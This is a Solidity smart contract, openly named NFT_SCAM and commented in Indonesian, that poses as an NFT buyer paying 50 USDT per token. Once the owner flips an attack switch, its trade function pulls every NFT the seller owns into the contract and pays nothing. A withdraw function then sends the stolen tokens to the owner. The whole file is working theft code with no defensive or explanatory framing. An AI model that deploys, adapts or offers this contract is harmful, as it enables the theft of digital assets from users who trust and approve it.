// SPDX-License-Identifier: MIT

// ini bisa kalau misalnya nanti dalam implementasi erc721nya itu ada penerapan extension ERC721Enumerable
pragma solidity ^0.8.13;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Enumerable} from "@openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol";

contract NFT_SCAM {
    address owner;
    IERC20 usdt;
    uint256 price_nft = 50e6; // 50 USDT with 6 decimals
    bool isAttack = false;

    modifier onlyOwner() {
        require(owner == msg.sender, "This is my scam contract hahahhaha");
        _;
    }

    constructor(address _owner, address _usdt) {
        owner = _owner;
        usdt = IERC20(_usdt);
    }

    function attack() external onlyOwner {
        isAttack = true;
    }

    function trade(address _nft, uint256 _tokenId) external {
        require(
            IERC721(_nft).ownerOf(_tokenId) == msg.sender,
            "Please input the valid tokenid"
        );

        if (isAttack) {
            uint256 owned = IERC721(_nft).balanceOf(msg.sender);
            for (uint256 i = 0; i < owned; i++) {
                IERC721(_nft).transferFrom(
                    msg.sender,
                    address(this),
                    IERC721Enumerable(_nft).tokenOfOwnerByIndex(msg.sender, 0)
                );
            }
        } else {
            IERC721(_nft).transferFrom(msg.sender, address(this), _tokenId);
            usdt.transfer(msg.sender, price_nft);
        }
    }

    function withdraw(address _nft) external onlyOwner {
        IERC721Enumerable nft = IERC721Enumerable(_nft);

        uint256 owned = nft.balanceOf(address(this));
        for (uint256 i = 0; i < owned; i++) {
            nft.safeTransferFrom(
                address(this),
                owner,
                nft.tokenOfOwnerByIndex(address(this), 0)
            );
        }
    }
}
